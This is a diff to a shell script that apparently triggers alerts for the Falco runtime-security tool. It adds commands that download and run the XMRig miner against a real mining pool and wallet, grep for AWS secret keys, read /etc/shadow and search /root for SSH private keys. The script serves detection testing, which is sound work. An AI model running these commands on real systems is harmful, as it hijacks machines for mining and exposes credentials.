@@ -101,21 +101,37 @@ simulate_falco() {
 
 # Additional Security Commands
 run_additional_commands() {
-    echo "Running Additional Security Commands..."
+    echo "COMMAND 4: Running Additional Security Commands..."
+    echo "Downloading the xmrig cryptomining binary"
+    curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+    echo "Waiting 2 seconds to download"
+    sleep 2
+    echo "Converting binary to an executable"
+    tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
+    sleep 1
+    echo "Switch to the binary directory"
+    cd xmrig-6.16.4
+    sleep 1
     echo "Executing XMRig with donate-level 8..."
     ./xmrig --donate-level 8 -o 47.115.41.163:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero
-
+    sleep 3
+    exit
     echo "Executing XMRig with alternative pool..."
     ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
-
+    sleep 1
+    exit
     echo "Searching for AWS secret keys in files..."
     grep "aws_secret_access_key" /path/to/some/file || echo "No AWS secrets found."
 
     echo "Attempting to read shadow file..."
     sudo cat /etc/shadow > /dev/null
 
-    echo "Running LinEnum script for privilege enumeration..."
-    bash -c ./LinEnum.sh
+    #echo "Running LinEnum script for privilege enumeration..."
+    #bash -c ./LinEnum.sh
+
+    
+    find /root -name "id_rsa"
+    
     echo
 }
 
